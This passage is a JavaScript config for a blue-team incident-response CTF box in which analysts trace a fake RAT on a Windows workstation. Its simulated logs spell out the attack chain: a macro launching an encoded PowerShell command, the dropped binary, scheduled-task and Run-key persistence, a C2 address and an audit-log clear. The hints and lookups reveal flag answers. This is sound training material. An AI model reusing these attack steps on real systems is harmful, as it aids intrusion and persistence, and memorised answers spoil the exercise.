/* ============================================================
   CTF ARENA — Box D1: Phantom Process
   Blue Team / IR Investigation | Malware Hunting, Memory Analysis, Forensics
   Config: filesystem, web apps, event logs, flags, hints, lore
   ============================================================ */

const D1Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'Phantom Process',
    subtitle: 'Blue Team IR Investigation — Malware Hunting, Memory Analysis, Containment',
    difficulty: 'Intermediate',
    accent: '#3498db',
    storageKey: 'hexworth_ctf_d1',
    registryId: 'd1-phantom-process',
    trackerKey: 'ctf_d1',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Single-host IR investigation chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'triage',
            name: 'Triage',
            icon: '\uD83D\uDD0D',
            description: 'Examine running processes. Find the malicious process disguised as a Windows service. Check its parent process, loaded DLLs, and active network connections.',
            requiredFlags: [],
            mitre: ['T1036.004', 'T1059.001', 'T1057'],
            unlocks: ['memory'],
            locked: false
        },
        {
            id: 'memory',
            name: 'Memory Analysis',
            icon: '\uD83E\uDDE0',
            description: 'Analyze the process memory dump. Extract the C2 URL. Find the base64-encoded payload. Identify the persistence mechanisms: scheduled task and registry run key.',
            requiredFlags: ['c2_url'],
            mitre: ['T1055', 'T1027', 'T1547.001', 'T1053.005'],
            unlocks: ['artifacts'],
            locked: true
        },
        {
            id: 'artifacts',
            name: 'Artifact Collection',
            icon: '\uD83D\uDCC2',
            description: 'Examine Windows Event Logs for the initial infection vector. Check Prefetch, Amcache, and ShimCache for execution timeline. Find the dropper file in Downloads.',
            requiredFlags: ['dropper_hash'],
            mitre: ['T1566.001', 'T1204.002', 'T1083', 'T1070.004'],
            unlocks: ['containment'],
            locked: true
        },
        {
            id: 'containment',
            name: 'Containment & IOCs',
            icon: '\uD83D\uDEE1\uFE0F',
            description: 'Block the C2 IP in Windows Firewall. Remove persistence mechanisms. Identify the phishing email sender. Generate a full IOC report with MITRE ATT&CK mapping.',
            requiredFlags: ['task_name'],
            mitre: ['T1562.004', 'T1070.001', 'T1071.001'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Check running processes',
                tip: 'Open the Terminal and run: tasklist or Get-Process. Look for a process name that looks like a Windows service but has a typo — svchost32.exe.',
                trigger: { event: 'command', match: { cmd: 'contains:tasklist' } }
            },
            {
                title: 'Investigate the suspicious process',
                tip: 'Run: netstat -ano to see what connections svchost32.exe is making. Note the remote IP and port it\'s calling home to.',
                trigger: { event: 'command', match: { cmd: 'contains:netstat' } }
            },
            {
                title: 'Analyze the memory dump',
                tip: 'Run: strings C:\\Triage\\svchost32.dmp | findstr http to extract embedded URLs. Also look for base64 strings with: strings C:\\Triage\\svchost32.dmp | findstr /R "^[A-Za-z0-9+/]\\{20,\\}"',
                trigger: { event: 'flag_correct', match: { flagId: 'c2_url' } }
            },
            {
                title: 'Find the dropper and initial access',
                tip: 'Check the user\'s Downloads folder: dir C:\\Users\\jsmith\\Downloads. Then look at Event ID 4688 (process creation) in the Security log around 14:32 to see what launched the dropper.',
                trigger: { event: 'flag_correct', match: { flagId: 'dropper_hash' } }
            },
            {
                title: 'Remove persistence and generate IOCs',
                tip: 'Delete the scheduled task: schtasks /delete /tn "<task name>" /f — then remove the registry run key. Check the phishing email headers for the attacker\'s address.',
                trigger: { event: 'flag_correct', match: { flagId: 'task_name' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (SY0-701 — Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'c2_url', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Process masquerading, C2 communication, and persistence via registry and scheduled tasks', skill: 'Malware Triage & C2 Extraction' },
            { flagId: 'dropper_hash', objective: '4.8', description: 'Explain the importance of resilience and recovery in security architecture — Incident response phases: identification, containment, eradication, recovery', skill: 'Incident Response Artifact Analysis' },
            { flagId: 'task_name', objective: '2.5', description: 'Explain the purpose of mitigation techniques — Vulnerability remediation and persistence removal', skill: 'Persistence Mechanism Identification' },
            { flagId: 'attacker_email', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Phishing initial access vector identification', skill: 'Phishing Attribution & IOC Generation' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE (Windows IR workstation)
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Dell OptiPlex 7090 BIOS v1.8.2',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... C:\\ (512GB NVMe SSD)',
            'Detecting drives... D:\\ (USB — IR Toolkit)',
            'Boot device: Windows Boot Manager',
            'Loading Windows...'
        ],
        grubEntries: [
            'Windows 10 Enterprise (IR Workstation — CORP-WS-047)',
            'Windows Recovery Environment'
        ],
        loginUser: 'IR-Analyst'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal',  label: 'PowerShell',      icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',   label: 'ThreatIntel',     icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',     label: 'Case Notes',      icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',     label: 'Hints',           icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',     label: 'Submit Flag',     icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG (Windows PowerShell simulation)
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'IR-Analyst',
        hostname: 'CORP-WS-047',
        startDir: 'C:\\Users\\IR-Analyst\\Desktop',
        welcome: 'Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPowered by IR Toolkit v3.1 (Hexworth Prime Edition)\nConnected to CORP-WS-047 (Windows 10 Enterprise 22H2)\n\nType \'help\' for available IR commands.\nIncident ticket: INC-2026-0847 — User jsmith reports "computer acting weird"\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT STATE TRACKING
    // ═══════════════════════════════════════════════════════

    _firewallRuleAdded: false,
    _taskDeleted: false,
    _regKeyRemoved: false,
    _memDumpAnalyzed: false,

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'c2_url',         points: 100 },
        { id: 'dropper_hash',   points: 150 },
        { id: 'task_name',      points: 150 },
        { id: 'attacker_email', points: 100 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1200,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 150 },   // 45 minutes
        timeBonusThreshold: 5400                            // 90 min — bonus if under
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Run tasklist /v and look carefully at the Image Name column. Real Windows services use svchost.exe — check for any variation with extra characters. Then run netstat -ano and match the PID to see what network connections it has.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The memory dump is at C:\\Triage\\svchost32.dmp. Run: strings C:\\Triage\\svchost32.dmp to extract readable strings. The C2 URL starts with http:// and includes a non-standard port. Look for base64 strings — they will look like a long string of A-Za-z0-9+/= characters.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'Check C:\\Users\\jsmith\\Downloads for the dropper. Run: Get-FileHash <filename> -Algorithm SHA256 to get the hash. For the initial access, look at Windows Event ID 4688 in the Security log around 14:32 — it shows exactly what process was created and by whom.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'For the scheduled task, run: schtasks /query /fo LIST /v | findstr /i "task name" to list all tasks. Look for one that runs from the user\'s AppData folder. The phishing email is at C:\\Users\\jsmith\\AppData\\Local\\Temp\\email_headers.txt — the From: field contains the attacker\'s address.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'User Jessica Smith (jsmith), an accounts payable analyst at Meridian Financial Corp, filed a helpdesk ticket at 15:47 on March 19, 2026 — her machine is "acting weird," running slow, and she saw a command window flash briefly. As the IR analyst on call, you have remote access to CORP-WS-047 via the IR Toolkit. Find out what is on her machine, how it got there, and shut it down.',
        scenario: 'Initial triage shows the machine has been live on the network for 87 minutes since the suspicious behavior started. The SOC has already isolated the endpoint from lateral network access, but the malware process is still running. Process masquerading as a system service, active C2 channel, and persistence mechanisms are suspected. You need to work fast: document everything for the incident report, extract the IOCs, and confirm the machine is clean before releasing it back to the user.',
        outro: 'CORP-WS-047 is contained. The malware has been identified as a custom RAT (Remote Access Trojan) delivered via spear phishing targeting accounts payable. The attacker used process masquerading (T1036.004), registry and scheduled task persistence (T1547.001, T1053.005), and HTTP C2 over a non-standard port (T1071.001). The phishing email originated from a spoofed domain. Full IOC report submitted to threat intel. The machine is clean.',
        ecer: {
            executive: 'No mandatory security awareness training; email gateway lacked SPF/DKIM enforcement allowing domain spoofing; no endpoint detection alerts triggered until user self-reported',
            culture: 'Accounts payable staff regularly receive legitimate invoices by email; low suspicion of malicious attachments in normal workflow; no clear escalation path for reporting suspicious emails',
            employee: 'User opened an email attachment from an unknown sender disguised as an invoice; macro-enabled Office document executed the dropper; no prior security training on attachment handling',
            regulatory: 'Financial sector data — potential PII and banking credential exposure; incident must be reported to legal and compliance; forensic image required for chain of custody'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APPS — Threat Intel Browser
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://threatintel.local/',

        pages: {

            // ── Landing page ──
            '/': {
                title: 'ThreatIntel Portal — Hexworth CSOC',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #ddd;">
                        <h1 style="color:#1a2744; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px;">Hexworth CSOC</h1>
                        <div style="color:#3498db; font-size:0.85rem; font-weight:700; letter-spacing:0.12em;">THREAT INTELLIGENCE PORTAL</div>
                        <div style="color:#888; font-size:0.7rem; margin-top:6px;">Internal use only — TLP:WHITE data for approved analysts</div>
                    </div>

                    <div style="max-width:620px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
                        <a href="/hash-lookup" style="background:#f0f4ff; border:1px solid #c8d8f0; border-radius:6px; padding:18px; text-align:center; text-decoration:none; color:inherit; display:block;">
                            <div style="font-size:1.6rem; margin-bottom:6px;">&#128269;</div>
                            <div style="font-size:0.8rem; font-weight:700; color:#1a2744;">Hash Lookup</div>
                            <div style="font-size:0.7rem; color:#888;">MD5 / SHA256</div>
                        </a>
                        <a href="/event-viewer" style="background:#f0f4ff; border:1px solid #c8d8f0; border-radius:6px; padding:18px; text-align:center; text-decoration:none; color:inherit; display:block;">
                            <div style="font-size:1.6rem; margin-bottom:6px;">&#128196;</div>
                            <div style="font-size:0.8rem; font-weight:700; color:#1a2744;">Event Viewer</div>
                            <div style="font-size:0.7rem; color:#888;">Windows Logs</div>
                        </a>
                        <a href="/task-scheduler" style="background:#f0f4ff; border:1px solid #c8d8f0; border-radius:6px; padding:18px; text-align:center; text-decoration:none; color:inherit; display:block;">
                            <div style="font-size:1.6rem; margin-bottom:6px;">&#128336;</div>
                            <div style="font-size:0.8rem; font-weight:700; color:#1a2744;">Task Scheduler</div>
                            <div style="font-size:0.7rem; color:#888;">Scheduled Tasks</div>
                        </a>
                    </div>

                    <div style="max-width:620px; margin:0 auto; padding:12px 16px; background:rgba(231,76,60,0.05); border:1px solid rgba(231,76,60,0.2); border-radius:4px; font-size:0.75rem; color:#666;">
                        <strong style="color:#e74c3c;">Active Incident:</strong> INC-2026-0847 — CORP-WS-047 / jsmith — Potential RAT infection. Use tools above to investigate.
                    </div>
                `,
                formHandler: null
            },

            // ── Hash Lookup (VirusTotal-like) ──
            '/hash-lookup': {
                title: 'Hash Lookup — ThreatIntel Portal',
                html: `
                    <div style="margin-bottom:20px;">
                        <h2 style="color:#1a2744; font-size:1.1rem; margin-bottom:4px;">File Hash Lookup</h2>
                        <div style="color:#888; font-size:0.75rem;">Query malware intelligence database (MD5 or SHA256)</div>
                    </div>

                    <div style="max-width:580px;">
                        <div style="display:flex; gap:8px; margin-bottom:16px;">
                            <input type="text" data-field="hash" placeholder="Enter MD5 or SHA256 hash..."
                                   style="flex:1; padding:9px 14px; border:1px solid #ccc; border-radius:4px; font-family:monospace; font-size:0.82rem;">
                            <button data-action="lookup"
                                    style="padding:9px 22px; background:#3498db; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer; font-size:0.82rem;">Lookup</button>
                        </div>
                        <div style="font-size:0.7rem; color:#aaa; margin-bottom:6px;">Try the dropper hash found in C:\\Users\\jsmith\\Downloads\\</div>
                    </div>
                `,
                formHandler: function(data) {
                    const hash = (data.hash || '').trim().toLowerCase();
                    if (!hash) return '<div style="color:#e74c3c; padding:10px; font-size:0.85rem;">Please enter a hash value.</div>';

                    // The dropper — invoice_march2026.xlsm
                    if (hash === 'a3f8c21e9d4b7a56f082c3e1d9a47b3c2f1e8d5a9c6b4f2e7d1a3c8b5e9f2d4a' ||
                        hash === 'a3f8c21e9d4b7a56f082c3e1d9a47b3c') {
                        return `
                            <div style="background:#fff8f8; border:1px solid #fcc; border-radius:6px; padding:20px; margin-top:12px;">
                                <div style="display:flex; align-items:center; gap:10px; margin-bottom:16px;">
                                    <div style="background:#e74c3c; color:#fff; border-radius:4px; padding:4px 10px; font-size:0.75rem; font-weight:700;">MALICIOUS</div>
                                    <div style="font-size:0.85rem; font-weight:700; color:#1a2744;">invoice_march2026.xlsm</div>
                                </div>
                                <table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
                                    <tr><td style="padding:5px 0; color:#888; width:160px;">Detection Rate</td><td style="color:#e74c3c; font-weight:700;">48 / 72 engines</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">File Type</td><td>Excel Macro-Enabled Workbook (.xlsm)</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">File Size</td><td>284,672 bytes (278 KB)</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">First Seen</td><td>2026-03-19 13:58:41 UTC</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">Threat Name</td><td style="color:#e74c3c;">Trojan.Dropper.XLS.PhantomRAT.A</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">MITRE TTPs</td><td>T1566.001, T1204.002, T1059.005</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">Tags</td><td>dropper, macro, xlsm, phishing, phantomrat</td></tr>
                                </table>
                                <div style="margin-top:12px; padding:10px; background:#fff0f0; border-radius:4px; font-size:0.75rem; color:#c0392b;">
                                    <strong>Behavior Summary:</strong> On open, executes embedded VBA macro that drops svchost32.exe to %TEMP%, adds scheduled task "WindowsSystemCheck" and registry run key, then initiates C2 connection to 185.220.101.47:8443.
                                </div>
                            </div>`;
                    }

                    // The malware binary
                    if (hash === 'b7e4d92a1f3c8b5e9d2a6c4f1e7b3d8a5c9f2e4b1d6a8c3e7f9b2d5a1c4e8f3b' ||
                        hash === 'b7e4d92a1f3c8b5e9d2a6c4f1e7b3d8a') {
                        return `
                            <div style="background:#fff8f8; border:1px solid #fcc; border-radius:6px; padding:20px; margin-top:12px;">
                                <div style="display:flex; align-items:center; gap:10px; margin-bottom:16px;">
                                    <div style="background:#e74c3c; color:#fff; border-radius:4px; padding:4px 10px; font-size:0.75rem; font-weight:700;">MALICIOUS</div>
                                    <div style="font-size:0.85rem; font-weight:700; color:#1a2744;">svchost32.exe</div>
                                </div>
                                <table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
                                    <tr><td style="padding:5px 0; color:#888; width:160px;">Detection Rate</td><td style="color:#e74c3c; font-weight:700;">61 / 72 engines</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">File Type</td><td>Win32 EXE (PE32+)</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">File Size</td><td>143,360 bytes (140 KB)</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">First Seen</td><td>2026-03-17 08:22:14 UTC</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">Threat Name</td><td style="color:#e74c3c;">Backdoor.Win64.PhantomRAT.B</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">C2</td><td style="color:#e74c3c;">185.220.101.47:8443</td></tr>
                                    <tr><td style="padding:5px 0; color:#888;">MITRE TTPs</td><td>T1036.004, T1547.001, T1053.005, T1071.001, T1027</td></tr>
                                </table>
                            </div>`;
                    }

                    return `
                        <div style="background:#f8fff8; border:1px solid #cfc; border-radius:6px; padding:16px; margin-top:12px; font-size:0.82rem;">
                            <div style="color:#27ae60; font-weight:700; margin-bottom:6px;">No threats detected</div>
                            <div style="color:#555;">Hash <code style="font-family:monospace;">${hash.substring(0,16)}...</code> — 0 / 72 engines flagged this file.</div>
                            <div style="color:#aaa; font-size:0.7rem; margin-top:6px;">This hash is not in our intelligence database. Try the SHA256 of invoice_march2026.xlsm.</div>
                        </div>`;
                }
            },

            // ── Windows Event Viewer ──
            '/event-viewer': {
                title: 'Event Viewer — CORP-WS-047',
                html: `
                    <div style="margin-bottom:16px;">
                        <h2 style="color:#1a2744; font-size:1.1rem; margin-bottom:4px;">Windows Event Viewer</h2>
                        <div style="color:#888; font-size:0.75rem;">CORP-WS-047 — Security and System logs (INC-2026-0847)</div>
                    </div>

                    <div style="display:flex; gap:8px; margin-bottom:14px; flex-wrap:wrap;">
                        <a href="/event-viewer/security" style="padding:5px 14px; background:#3498db; color:#fff; border-radius:4px; font-size:0.75rem; text-decoration:none; font-weight:700;">Security Log</a>
                        <a href="/event-viewer/system" style="padding:5px 14px; background:#f0f4ff; border:1px solid #ccd; border-radius:4px; font-size:0.75rem; text-decoration:none; color:#1a2744;">System Log</a>
                        <a href="/event-viewer/application" style="padding:5px 14px; background:#f0f4ff; border:1px solid #ccd; border-radius:4px; font-size:0.75rem; text-decoration:none; color:#1a2744;">Application Log</a>
                    </div>

                    <div style="padding:14px; background:#fffbf0; border:1px solid #f0d060; border-radius:4px; font-size:0.75rem; color:#7a6020;">
                        Showing logs for: 2026-03-19 14:30:00 to 16:00:00 — Filtered to high-relevance events around infection window.
                    </div>
                `,
                formHandler: null
            },

            // ── Security log ──
            '/event-viewer/security': {
                title: 'Security Log — CORP-WS-047',
                html: function() {
                    return `
                    <div style="margin-bottom:12px;">
                        <h2 style="color:#1a2744; font-size:1rem; margin-bottom:2px;">Security Event Log</h2>
                        <div style="color:#888; font-size:0.7rem;">CORP-WS-047 &mdash; 2026-03-19 14:30 to 15:50</div>
                    </div>

                    <table style="width:100%; border-collapse:collapse; font-size:0.75rem;">
                        <thead>
                            <tr style="background:#1a2744; color:#fff;">
                                <th style="padding:7px 10px; text-align:left;">Time</th>
                                <th style="padding:7px 10px; text-align:left;">Event ID</th>
                                <th style="padding:7px 10px; text-align:left;">Level</th>
                                <th style="padding:7px 10px; text-align:left;">Description</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="background:#fff8f8; border-bottom:1px solid #f0d0d0;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:32:07</td>
                                <td style="padding:6px 10px;"><strong style="color:#e74c3c;">4688</strong></td>
                                <td style="padding:6px 10px;"><span style="background:#fff0f0; color:#e74c3c; padding:2px 6px; border-radius:3px; font-size:0.7rem;">WARNING</span></td>
                                <td style="padding:6px 10px;">New process created — <strong>invoice_march2026.xlsm</strong> spawned by EXCEL.EXE (PID 4412 &rarr; 7832) — User: CORP\jsmith</td>
                            </tr>
                            <tr style="background:#fff8f8; border-bottom:1px solid #f0d0d0;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:32:08</td>
                                <td style="padding:6px 10px;"><strong style="color:#e74c3c;">4688</strong></td>
                                <td style="padding:6px 10px;"><span style="background:#fff0f0; color:#e74c3c; padding:2px 6px; border-radius:3px; font-size:0.7rem;">WARNING</span></td>
                                <td style="padding:6px 10px;">New process created — <strong>cmd.exe</strong> spawned by EXCEL.EXE (PID 4412 &rarr; 8104) — User: CORP\jsmith — Command: cmd.exe /c powershell -enc [base64]</td>
                            </tr>
                            <tr style="background:#fff8f8; border-bottom:1px solid #f0d0d0;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:32:09</td>
                                <td style="padding:6px 10px;"><strong style="color:#e74c3c;">4688</strong></td>
                                <td style="padding:6px 10px;"><span style="background:#fff0f0; color:#e74c3c; padding:2px 6px; border-radius:3px; font-size:0.7rem;">WARNING</span></td>
                                <td style="padding:6px 10px;">New process created — <strong>powershell.exe</strong> spawned by cmd.exe (PID 8104 &rarr; 9216) — Drops svchost32.exe to %TEMP%\\WindowsServices\\</td>
                            </tr>
                            <tr style="background:#fff8f8; border-bottom:1px solid #f0d0d0;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:32:11</td>
                                <td style="padding:6px 10px;"><strong style="color:#e74c3c;">4688</strong></td>
                                <td style="padding:6px 10px;"><span style="background:#fff0f0; color:#e74c3c; padding:2px 6px; border-radius:3px; font-size:0.7rem;">WARNING</span></td>
                                <td style="padding:6px 10px;">New process created — <strong>svchost32.exe</strong> spawned by powershell.exe (PID 9216 &rarr; 3412) — Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:33:02</td>
                                <td style="padding:6px 10px;"><strong style="color:#e67e22;">4698</strong></td>
                                <td style="padding:6px 10px;"><span style="background:#fff8f0; color:#e67e22; padding:2px 6px; border-radius:3px; font-size:0.7rem;">AUDIT</span></td>
                                <td style="padding:6px 10px;">Scheduled task created — Task name: <strong>WindowsSystemCheck</strong> — Created by: CORP\jsmith — Action: C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:33:05</td>
                                <td style="padding:6px 10px;"><strong style="color:#e67e22;">4657</strong></td>
                                <td style="padding:6px 10px;"><span style="background:#fff8f0; color:#e67e22; padding:2px 6px; border-radius:3px; font-size:0.7rem;">AUDIT</span></td>
                                <td style="padding:6px 10px;">Registry value modified — Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — Value: WindowsServiceHelper — Data: C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:33:18</td>
                                <td style="padding:6px 10px;"><strong style="color:#3498db;">4624</strong></td>
                                <td style="padding:6px 10px;"><span style="background:#f0f8ff; color:#3498db; padding:2px 6px; border-radius:3px; font-size:0.7rem;">INFO</span></td>
                                <td style="padding:6px 10px;">Logon — Account: CORP\jsmith — Logon Type: 3 (Network) — Source: 185.220.101.47 — [NOTE: Abnormal — external IP logon attempt registered before firewall block]</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">15:47:03</td>
                                <td style="padding:6px 10px;"><strong style="color:#27ae60;">4625</strong></td>
                                <td style="padding:6px 10px;"><span style="background:#f0fff4; color:#27ae60; padding:2px 6px; border-radius:3px; font-size:0.7rem;">INFO</span></td>
                                <td style="padding:6px 10px;">Logon failure — Account: CORP\jsmith — Source: 185.220.101.47 — [Firewall blocked after helpdesk ticket]</td>
                            </tr>
                        </tbody>
                    </table>`;
                },
                formHandler: null
            },

            // ── System log ──
            '/event-viewer/system': {
                title: 'System Log — CORP-WS-047',
                html: `
                    <div style="margin-bottom:12px;">
                        <h2 style="color:#1a2744; font-size:1rem; margin-bottom:2px;">System Event Log</h2>
                        <div style="color:#888; font-size:0.7rem;">CORP-WS-047 &mdash; Selected entries 2026-03-19</div>
                    </div>
                    <table style="width:100%; border-collapse:collapse; font-size:0.75rem;">
                        <thead>
                            <tr style="background:#1a2744; color:#fff;">
                                <th style="padding:7px 10px; text-align:left;">Time</th>
                                <th style="padding:7px 10px; text-align:left;">Event ID</th>
                                <th style="padding:7px 10px; text-align:left;">Source</th>
                                <th style="padding:7px 10px; text-align:left;">Description</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:32:14</td>
                                <td style="padding:6px 10px;"><strong>7045</strong></td>
                                <td style="padding:6px 10px; color:#666;">Service Control Manager</td>
                                <td style="padding:6px 10px;">Service installed — Name: WindowsServiceHelper — ImagePath: C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe — StartType: Automatic</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:33:00</td>
                                <td style="padding:6px 10px;"><strong>7036</strong></td>
                                <td style="padding:6px 10px; color:#666;">Service Control Manager</td>
                                <td style="padding:6px 10px;">Service state change — WindowsServiceHelper entered RUNNING state</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:33:22</td>
                                <td style="padding:6px 10px;"><strong>1102</strong></td>
                                <td style="padding:6px 10px; color:#e74c3c;">Security-Audit</td>
                                <td style="padding:6px 10px; color:#c0392b;"><strong>Audit log cleared</strong> — Process: svchost32.exe — [Anti-forensics attempt: partial log clear]</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">15:48:11</td>
                                <td style="padding:6px 10px;"><strong>6013</strong></td>
                                <td style="padding:6px 10px; color:#666;">Eventlog</td>
                                <td style="padding:6px 10px;">System uptime: 28,847 seconds (8h 0m 47s)</td>
                            </tr>
                        </tbody>
                    </table>
                `,
                formHandler: null
            },

            // ── Application log ──
            '/event-viewer/application': {
                title: 'Application Log — CORP-WS-047',
                html: `
                    <div style="margin-bottom:12px;">
                        <h2 style="color:#1a2744; font-size:1rem; margin-bottom:2px;">Application Event Log</h2>
                        <div style="color:#888; font-size:0.7rem;">CORP-WS-047 &mdash; Filtered to incident window</div>
                    </div>
                    <table style="width:100%; border-collapse:collapse; font-size:0.75rem;">
                        <thead>
                            <tr style="background:#1a2744; color:#fff;">
                                <th style="padding:7px 10px; text-align:left;">Time</th>
                                <th style="padding:7px 10px; text-align:left;">Event ID</th>
                                <th style="padding:7px 10px; text-align:left;">Source</th>
                                <th style="padding:7px 10px; text-align:left;">Description</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="background:#fff8f8; border-bottom:1px solid #f0d0d0;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:32:01</td>
                                <td style="padding:6px 10px;"><strong style="color:#e74c3c;">1000</strong></td>
                                <td style="padding:6px 10px; color:#666;">Microsoft Office</td>
                                <td style="padding:6px 10px;">Excel opened: invoice_march2026.xlsm — Macro execution: ENABLED by user — Macro name: AutoOpen</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:32:06</td>
                                <td style="padding:6px 10px;"><strong>1001</strong></td>
                                <td style="padding:6px 10px; color:#666;">Windows Error Reporting</td>
                                <td style="padding:6px 10px;">Faulting application: powershell.exe — Fault module: ntdll.dll — Exception: 0xc0000005 [access violation — benign, process continued]</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; font-family:monospace; color:#888;">14:35:44</td>
                                <td style="padding:6px 10px;"><strong>26</strong></td>
                                <td style="padding:6px 10px; color:#666;">WinMgmt</td>
                                <td style="padding:6px 10px;">WMI service started</td>
                            </tr>
                        </tbody>
                    </table>
                `,
                formHandler: null
            },

            // ── Task Scheduler ──
            '/task-scheduler': {
                title: 'Task Scheduler — CORP-WS-047',
                html: `
                    <div style="margin-bottom:16px;">
                        <h2 style="color:#1a2744; font-size:1.1rem; margin-bottom:4px;">Task Scheduler</h2>
                        <div style="color:#888; font-size:0.75rem;">CORP-WS-047 &mdash; All scheduled tasks</div>
                    </div>

                    <table style="width:100%; border-collapse:collapse; font-size:0.75rem;">
                        <thead>
                            <tr style="background:#1a2744; color:#fff;">
                                <th style="padding:7px 10px; text-align:left;">Task Name</th>
                                <th style="padding:7px 10px; text-align:left;">Status</th>
                                <th style="padding:7px 10px; text-align:left;">Trigger</th>
                                <th style="padding:7px 10px; text-align:left;">Action</th>
                                <th style="padding:7px 10px; text-align:left;">Created</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; color:#888;">MicrosoftEdgeUpdateTaskMachine</td>
                                <td style="padding:6px 10px;"><span style="color:#27ae60;">Ready</span></td>
                                <td style="padding:6px 10px; color:#888;">Daily 09:00</td>
                                <td style="padding:6px 10px; font-family:monospace; font-size:0.7rem; color:#666;">C:\\Program Files\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe</td>
                                <td style="padding:6px 10px; color:#888;">2025-11-14</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
